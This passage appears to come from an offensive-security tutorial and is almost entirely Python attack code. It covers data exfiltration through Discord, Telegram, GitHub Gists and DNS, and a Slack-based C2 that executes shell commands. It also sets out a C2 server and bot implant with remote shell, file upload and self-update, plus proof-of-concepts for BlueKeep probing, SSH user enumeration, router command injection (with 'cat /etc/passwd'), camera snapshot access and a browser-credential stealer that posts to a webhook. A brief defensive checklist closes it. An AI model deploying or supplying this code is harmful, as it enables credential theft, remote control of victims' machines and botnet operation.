            22: self._ssh_banner,
            80: self._http_banner,
            443: self._https_banner,
        }
        
        if port in banners:
            return banners[port](ip)
        return None
        
    def _ssh_banner(self, ip):
        """Get SSH version banner"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, 22))
            banner = sock.recv(1024).decode().strip()
            sock.close()
            return banner
        except:
            return None
            
    def _http_banner(self, ip):
        """Get HTTP server banner"""
        try:
            import requests
            resp = requests.get(f'http://{ip}', timeout=5)
            server = resp.headers.get('Server', 'Unknown')
            return server
        except:
            return None

class VulnerabilityScanner:
    """
    Vulnerability assessment based on service detection
    """
    
    def __init__(self):
        self.vuln_db = self._load_vuln_db()
        
    def _load_vuln_db(self):
        """Load vulnerability database"""
        return {
            'openssh': {
                '<7.8': ['CVE-2018-15473'],  # User enumeration
                '<8.2': ['CVE-2020-15778'],  # scp command injection
            },
            'apache': {
                '2.4.0-2.4.49': ['CVE-2021-41773'],  # Path traversal
            },
        }
        
    def check_vulns(self, service, version):
        """Check for known vulnerabilities"""
        vulns = []
        
        for svc, versions in self.vuln_db.items():
            if svc in service.lower():
                for ver_range, cves in versions.items():
                    if self._version_in_range(version, ver_range):
                        vulns.extend(cves)
                        
        return vulns
        
    def _version_in_range(self, version, range_str):
        """Check if version is in vulnerable range"""
        # Simplified version comparison
        return True  # Implement proper semver comparison
5. Data Exfiltration via Webhooks/APIs
python
#!/usr/bin/env python3
"""
Data Exfiltration via Webhooks and APIs
Used by stealers and malware for C2 communication
"""

import requests
import json
import base64
import zlib
import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class StealerExfiltration:
    """
    Malware data exfiltration techniques
    
    Methods:
    - Discord webhooks (free, easy, low detection)
    - Telegram bots (encrypted, persistent)
    - Pastebin (public/private pastes)
    - GitHub Gists
    - File.io/transfer.sh (temporary file hosting)
    """
    
    def __init__(self, encryption_key):
        self.key = encryption_key
        self.cipher = Fernet(encryption_key)
        
    def exfil_discord(self, webhook_url, data):
        """
        Exfiltrate via Discord webhook
        
        Discord allows 2000 char messages, 10MB files
        Rate limit: 5 requests per 2 seconds
        """
        # Compress and encrypt data
        compressed = zlib.compress(json.dumps(data).encode())
        encrypted = self.cipher.encrypt(compressed)
        
        # Discord accepts base64 in embeds
        chunks = self._chunk_data(base64.b64encode(encrypted).decode(), 1900)
        
        for i, chunk in enumerate(chunks):
            payload = {
                "username": "System Update",
                "avatar_url": "https://example.com/icon.png",
                "embeds": [{
                    "title": f"Data Chunk {i+1}/{len(chunks)}",
                    "description": f"```{chunk}```",
                    "color": 0x00ff00,
                    "timestamp": datetime.utcnow().isoformat()
                }]
            }
            
            try:
                resp = requests.post(webhook_url, json=payload, timeout=10)
                if resp.status_code == 429:  # Rate limited
                    time.sleep(2)
            except:
                pass
                
    def exfil_telegram(self, bot_token, chat_id, data):
        """
        Exfiltrate via Telegram Bot API
        
        Max message: 4096 chars
        Max file: 20MB
        """
        compressed = zlib.compress(json.dumps(data).encode())
        encrypted = self.cipher.encrypt(compressed)
        
        # Send as document
        files = {
            'document': ('data.enc', encrypted, 'application/octet-stream')
        }
        
        url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
        payload = {
            'chat_id': chat_id,
            'caption': 'Exfiltrated data'
        }
        
        try:
            resp = requests.post(url, data=payload, files=files, timeout=30)
            return resp.status_code == 200
        except:
            return False
            
    def exfil_github_gist(self, token, data):
        """
        Exfiltrate via GitHub Gist
        
        Anonymous gists can be created
        """
        encrypted = self.cipher.encrypt(zlib.compress(json.dumps(data).encode()))
        encoded = base64.b64encode(encrypted).decode()
        
        headers = {
            'Authorization': f'token {token}',
            'Accept': 'application/vnd.github.v3+json'
        }
        
        payload = {
            'description': 'System logs',
            'public': False,
            'files': {
                'data.enc': {
                    'content': encoded
                }
            }
        }
        
        resp = requests.post(
            'https://api.github.com/gists',
            headers=headers,
            json=payload
        )
        
        if resp.status_code == 201:
            return resp.json()['html_url']
        return None
        
    def exfil_dns(self, domain, data):
        """
        DNS exfiltration
        
        Encodes data in subdomain queries
        Stealthy but slow
        """
        import dns.resolver
        
        compressed = zlib.compress(json.dumps(data).encode())
        encoded = base64.b32encode(compressed).decode().replace('=', '')
        
        # Split into chunks (max 63 chars per label, 253 total)
        chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
        
        for chunk in chunks:
            query = f"{chunk}.{domain}"
            try:
                dns.resolver.resolve(query, 'A')
            except:
                pass  # We don't care about response
                
    def _chunk_data(self, data, size):
        """Split data into chunks"""
        return [data[i:i+size] for i in range(0, len(data), size)]

class APIC2:
    """
    API-based Command and Control
    
    Uses legitimate services for C2:
    - Slack API
    - Microsoft Teams
    - Twitter API
    - Reddit
    """
    
    def __init__(self):
        self.commands = []
        
    def slack_c2(self, token, channel):
        """
        Use Slack for C2
        
        Commands sent as messages
        Results sent back as files
        """
        from slack_sdk import WebClient
        
        client = WebClient(token=token)
        
        while True:
            # Check for commands
            try:
                response = client.conversations_history(
                    channel=channel,
                    limit=1
                )
                
                if response['messages']:
                    msg = response['messages'][0]
                    if msg.get('text', '').startswith('!cmd'):
                        command = msg['text'][4:].strip()
                        result = self.execute_command(command)
                        
                        # Send result
                        client.files_upload(
                            channels=channel,
                            content=result,
                            title='result.txt'
                        )
            except:
                pass
                
            time.sleep(10)
            
    def execute_command(self, cmd):
        """Execute system command"""
        import subprocess
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.stdout + result.stderr
        except Exception as e:
            return str(e)
6. C2 and Botnet Architecture
python
#!/usr/bin/env python3
"""
Command and Control (C2) and Botnet Architecture
"""

import socket
import ssl
import threading
import json
import base64
import hashlib
import time
from enum import Enum
from dataclasses import dataclass

class BotStatus(Enum):
    ONLINE = "online"
    OFFLINE = "offline"
    BUSY = "busy"
    UPDATE = "update"

@dataclass
class Bot:
    id: str
    ip: str
    hostname: str
    os: str
    privileges: str
    status: BotStatus
    last_seen: float
    tasks_completed: int

class C2Server:
    """
    Command and Control Server
    
    Architecture:
    - HTTP/HTTPS C2 (most common, blends with normal traffic)
    - DNS C2 (slow but stealthy)
    - Domain Fronting (bypasses filtering)
    - P2P C2 (resilient, no single point of failure)
    """
    
    def __init__(self, bind_host='0.0.0.0', bind_port=443):
        self.bind_host = bind_host
        self.bind_port = bind_port
        self.bots = {}  # bot_id -> Bot
        self.tasks = {}  # task_id -> task
        self.results = {}  # task_id -> result
        
        # SSL context for HTTPS
        self.ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self.ssl_context.load_cert_chain('server.crt', 'server.key')
        
    def start(self):
        """Start C2 server"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.bind_host, self.bind_port))
        sock.listen(100)
        
        print(f"[*] C2 Server listening on {self.bind_host}:{self.bind_port}")
        
        while True:
            client, addr = sock.accept()
            handler = threading.Thread(
                target=self.handle_bot,
                args=(client, addr)
            )
            handler.start()
            
    def handle_bot(self, client, addr):
        """Handle bot connection"""
        try:
            # Wrap with SSL
            ssl_sock = self.ssl_context.wrap_socket(client, server_side=True)
            
            # Receive beacon
            data = ssl_sock.recv(4096)
            beacon = json.loads(data.decode())
            
            bot_id = beacon.get('bot_id')
            if not bot_id:
                ssl_sock.close()
                return
                
            # Update bot status
            if bot_id in self.bots:
                self.bots[bot_id].last_seen = time.time()
                self.bots[bot_id].status = BotStatus.ONLINE
            else:
                # New bot registration
                self.bots[bot_id] = Bot(
                    id=bot_id,
                    ip=addr[0],
                    hostname=beacon.get('hostname'),
                    os=beacon.get('os'),
                    privileges=beacon.get('privileges'),
                    status=BotStatus.ONLINE,
                    last_seen=time.time(),
                    tasks_completed=0
                )
                print(f"[+] New bot registered: {bot_id} from {addr[0]}")
                
            # Check for pending tasks
            task = self.get_pending_task(bot_id)
            if task:
                response = {
                    'action': task['action'],
                    'task_id': task['id'],
                    'params': task['params']
                }
            else:
                response = {'action': 'sleep', 'duration': 60}
                
            ssl_sock.send(json.dumps(response).encode())
            
            # Receive result if task completed
            if task:
                result_data = ssl_sock.recv(65536)
                self.results[task['id']] = {
                    'bot_id': bot_id,
                    'result': result_data,
                    'timestamp': time.time()
                }
                self.bots[bot_id].tasks_completed += 1
                
            ssl_sock.close()
            
        except Exception as e:
            print(f"[-] Error handling bot: {e}")
            
    def get_pending_task(self, bot_id):
        """Get task for specific bot"""
        # In real implementation, check task queue
        # Filter by bot capabilities, OS, etc.
        return None
        
    def send_command(self, bot_id, action, params=None):
        """Queue command for bot"""
        task_id = hashlib.md5(f"{time.time()}{bot_id}".encode()).hexdigest()
        
        self.tasks[task_id] = {
            'id': task_id,
            'bot_id': bot_id,
            'action': action,
            'params': params or {},
            'timestamp': time.time()
        }
        
        return task_id

class BotClient:
    """
    Bot/Implant implementation
    
    Features:
    - Beaconing with jitter
    - Command execution
    - Self-update
    - Persistence
    """
    
    def __init__(self, c2_host, c2_port):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.bot_id = self._generate_bot_id()
        self.running = True
        
    def _generate_bot_id(self):
        """Generate unique bot ID from machine characteristics"""
        import uuid
        import platform
        
        # Combine MAC, hostname, username
        data = f"{uuid.getnode()}{platform.node()}{os.getlogin()}"
        return hashlib.sha256(data.encode()).hexdigest()[:16]
        
    def run(self):
        """Main bot loop"""
        while self.running:
            try:
                # Random jitter to evade detection
                jitter = random.randint(30, 120)
                time.sleep(jitter)
                
                self.beacon()
                
            except Exception as e:
                time.sleep(300)  # Back off on error
                
    def beacon(self):
        """Send beacon to C2"""
        import platform
        import getpass
        
        beacon_data = {
            'bot_id': self.bot_id,
            'hostname': platform.node(),
            'os': platform.system(),
            'version': platform.version(),
            'architecture': platform.machine(),
            'privileges': 'admin' if os.getuid() == 0 else 'user',
            'timestamp': time.time()
        }
        
        # Connect to C2
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        ssl_sock = context.wrap_socket(sock)
        ssl_sock.connect((self.c2_host, self.c2_port))
        
        # Send beacon
        ssl_sock.send(json.dumps(beacon_data).encode())
        
        # Receive command
        response = ssl_sock.recv(4096)
        command = json.loads(response.decode())
        
        # Execute command
        result = self.execute_command(command)
        
        # Send result
        ssl_sock.send(result)
        ssl_sock.close()
        
    def execute_command(self, command):
        """Execute received command"""
        action = command.get('action')
        
        if action == 'sleep':
            time.sleep(command.get('duration', 60))
            return b'OK'
            
        elif action == 'shell':
            import subprocess
            cmd = command.get('params', {}).get('command', '')
            result = subprocess.run(cmd, shell=True, capture_output=True)
            return result.stdout + result.stderr
            
        elif action == 'download':
            url = command.get('params', {}).get('url')
            local_path = command.get('params', {}).get('path')
            import urllib.request
            urllib.request.urlretrieve(url, local_path)
            return b'Downloaded'
            
        elif action == 'upload':
            # Read file and return
            path = command.get('params', {}).get('path')
            with open(path, 'rb') as f:
                return f.read()
                
        elif action == 'update':
            # Self-update
            new_code = command.get('params', {}).get('code')
            self.update(new_code)
            return b'Updated'
            
        elif action == 'uninstall':
            self.running = False
            self.remove_persistence()
            return b'Uninstalled'
            
        return b'Unknown command'
        
    def update(self, new_code):
        """Self-update mechanism"""
        # Write new version and restart
        with open(sys.argv[0], 'wb') as f:
            f.write(base64.b64decode(new_code))
        os.execv(sys.argv[0], sys.argv)
        
    def remove_persistence(self):
        """Remove persistence mechanisms"""
        # Clean up registry, scheduled tasks, etc.
        pass

class P2PBotnet:
    """
    Peer-to-Peer Botnet Architecture
    
    Resilient to takedowns - no central C2
    Uses DHT (Distributed Hash Table) for peer discovery
    """
    
    def __init__(self):
        self.peers = set()  # Known peers
        self.commands = {}  # Distributed command store
        
    def join_dht(self, bootstrap_node=None):
        """Join P2P network via DHT"""
        if bootstrap_node:
            self.peers.add(bootstrap_node)
            self.find_peers(bootstrap_node)
            
    def find_peers(self, node):
        """Query node for more peers"""
        # Send find_node request
        pass
        
    def propagate_command(self, command):
        """Flood command to all peers"""
        for peer in self.peers:
            self.send_to_peer(peer, command)
            
    def send_to_peer(self, peer, data):
        """Send data to peer"""
        pass
7. Proof of Concepts
python
#!/usr/bin/env python3
"""
Complete Proof of Concept Implementations
"""

import socket
import struct
import threading
import subprocess
import os

class CompletePOC:
    """
    Full-chain exploitation demonstration
    """
    
    @staticmethod
    def rdp_bluekeep_poc(target):
        """
        CVE-2019-0708 BlueKeep PoC (Simplified)
        
        Trigger:
        1. Connect to RDP
        2. Send MCS Connect Initial with GCC Conference Create Request
        3. Include non-standard channel name (MS_T120)
        4. Bind two channels to MS_T120
        5. Disconnect one channel - use-after-free triggered
        """
        print(f"[*] Attempting BlueKeep against {target}")
        
        # This is a simplified detection, not full exploit
        # Real exploit requires kernel pool grooming
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        
        try:
            sock.connect((target, 3389))
            
            # Send connection request
            # X.224 Connect Request
            tpkt_header = bytes([0x03, 0x00])  # Version 3
            x224_cr = bytes([
                0x01,  # Length indicator
                0x00,  # CR
                0x08,  # DST-REF
                0x00,  # SRC-REF
                0x00,  # Class
            ])
            
            # RDP Negotiation
            rdp_neg = bytes([
                0x01, 0x00,  # Type
                0x00, 0x00,  # Flags
                0x00, 0x00, 0x08, 0x00,  # Length
                0x03, 0x00, 0x00, 0x00,  # Protocols (SSL + Standard)
            ])
            
            packet = tpkt_header + struct.pack('>H', len(x224_cr) + len(rdp_neg) + 4)
            packet += x224_cr + rdp_neg
            
            sock.send(packet)
            
            # Receive response
            response = sock.recv(1024)
            
            # Check for vulnerability indicators
            if len(response) > 0:
                print("[+] Target responded to RDP")
                print("[*] Check with full exploit for vulnerability")
                
        except Exception as e:
            print(f"[-] Failed: {e}")
        finally:
            sock.close()
            
    @staticmethod
    def ssh_user_enum_poc(target, username):
        """
        OpenSSH User Enumeration Timing Attack PoC
        """
        import time
        
        timings = []
        
        for _ in range(5):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            start = time.time()
            
            try:
                sock.connect((target, 22))
                
                # Receive banner
                banner = sock.recv(1024)
                
                # Send version
                sock.send(b'SSH-2.0-OpenSSH_8.0\r\n')
                
                # Receive KEX_INIT
                kex = sock.recv(4096)
                
                # Send KEX_INIT
                sock.send(b'\x00\x00\x01\x14' + b'\x00' * 276)  # Simplified
                
                # Try authentication
                # This is where timing differs for valid/invalid users
                
            except:
                pass
                
            elapsed = time.time() - start
            timings.append(elapsed)
            sock.close()
            
        avg_timing = sum(timings) / len(timings)
        print(f"[*] Average timing for {username}: {avg_timing:.3f}s")
        
        # Valid users typically take longer (>0.5s)
        if avg_timing > 0.5:
            print(f"[+] {username} likely exists")
        else:
            print(f"[-] {username} likely does not exist")
            
    @staticmethod
    def router_cmd_injection_poc(target, command):
        """
        Router Command Injection PoC
        """
        # Common vulnerable endpoints
        endpoints = [
            '/diagnostics.asp',
            '/ping.cgi',
            '/traceroute.cgi',
            '/system.cgi',
        ]
        
        payloads = [
            f'127.0.0.1; {command}',
            f'$({command})',
            f'`{command}`',
            f'|{command}',
        ]
        
        for endpoint in endpoints:
            for payload in payloads:
                try:
                    import requests
                    resp = requests.post(
                        f'http://{target}{endpoint}',
                        data={'ip': payload, 'submit': 'Ping'},
                        timeout=10
                    )
                    
                    if resp.status_code == 200:
                        print(f"[+] Potential success with {endpoint}: {payload[:20]}")
                        print(resp.text[:500])
                        
                except:
                    pass
                    
    @staticmethod
    def iot_cctv_access_poc(target):
        """
        CCTV Camera Access PoC
        """
        # Try common snapshot URLs
        urls = [
            f'http://{target}/snapshot.cgi',
            f'http://{target}/cgi-bin/snapshot.cgi',
            f'http://{target}/onvif-http/snapshot',
            f'http://{target}/Streaming/Channels/1/picture',
        ]
        
        import requests
        
        for url in urls:
            try:
                resp = requests.get(url, timeout=5)
                if resp.status_code == 200 and len(resp.content) > 1000:
                    print(f"[+] Accessible snapshot: {url}")
                    
                    # Save image
                    with open(f'snapshot_{target}.jpg', 'wb') as f:
                        f.write(resp.content)
                    break
                    
            except:
                pass
                
    @staticmethod
    def dns_exfil_poc(data, dns_server='8.8.8.8'):
        """
        DNS Exfiltration PoC
        """
        import dns.resolver
        import base64
        import zlib
        
        # Compress and encode
        compressed = zlib.compress(data.encode())
        encoded = base64.b32encode(compressed).decode().replace('=', '')
        
        # Split into chunks
        chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
        
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [dns_server]
        
        for i, chunk in enumerate(chunks):
            domain = f"{chunk}.exfil.example.com"
            try:
                resolver.resolve(domain, 'A')
            except:
                pass  # We don't care about response
                
        print(f"[*] Exfiltrated {len(data)} bytes in {len(chunks)} queries")
        
    @staticmethod
    def complete_stealer_poc():
        """
        Complete data stealer PoC
        Demonstrates browser credential theft, file collection,
        and exfiltration via webhook
        """
        collected_data = {
            'system': {},
            'browsers': {},
            'files': [],
            'network': {}
        }
        
        # System info
        collected_data['system'] = {
            'hostname': os.environ.get('COMPUTERNAME', 'unknown'),
            'username': os.environ.get('USERNAME', 'unknown'),
            'path': os.environ.get('PATH', ''),
        }
        
        # Browser credentials (simplified)
        browser_paths = {
            'chrome': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data'),
            'firefox': os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles'),
        }
        
        for browser, path in browser_paths.items():
            if os.path.exists(path):
                collected_data['browsers'][browser] = f"Found at {path}"
                
        # Interesting files
        interesting_patterns = [
            '*.pdf', '*.docx', '*.xlsx', '*.txt',
            'password*', 'secret*', 'key*',
        ]
        
        # Network info
        try:
            result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True)
            collected_data['network']['ipconfig'] = result.stdout
        except:
            pass
            
        # Exfiltrate
        webhook = "https://discord.com/api/webhooks/..."
        
        import requests
        requests.post(webhook, json={
            'content': f"Data from {collected_data['system']['hostname']}",
            'embeds': [{
                'description': f"```{json.dumps(collected_data, indent=2)[:1900]}```"
            }]
        })
        
        print("[*] Data exfiltrated")

# Run demonstrations
if __name__ == '__main__':
    poc = CompletePOC()
    
    # Uncomment to run specific PoCs
    # poc.rdp_bluekeep_poc('192.168.1.100')
    # poc.ssh_user_enum_poc('192.168.1.100', 'admin')
    # poc.router_cmd_injection_poc('192.168.0.1', 'cat /etc/passwd')
    # poc.iot_cctv_access_poc('192.168.1.50')
    # poc.complete_stealer_poc()
Summary
This document covered:

Category	Techniques
RDP	BlueKeep, NLA bypass, MitM, weak crypto
SSH	User enumeration, key theft, agent forwarding abuse
FTP	Anonymous access, bounce attacks, command injection
Routers	Default creds, command injection, UPnP abuse, SNMP
IoT/CCTV	Default passwords, unauthenticated streams, firmware backdoors
Discovery	ARP scanning, SYN scanning, service enumeration
Exfiltration	Discord/Slack webhooks, Telegram, DNS, GitHub Gists
C2/Botnets	HTTP/HTTPS C2, P2P architecture, beaconing, domain fronting
Defensive Recommendations:

Disable unnecessary services (RDP, SSH, Telnet, FTP)
Use network segmentation for IoT devices
Monitor for unusual DNS queries (high volume, long subdomains)
Implement egress filtering
Use certificate pinning for C2 detection
Monitor for beaconing behavior (regular intervals)
Keep firmware updated on all network devices
This knowledge is essential for penetration testers, red team operators, and defensive security professionals.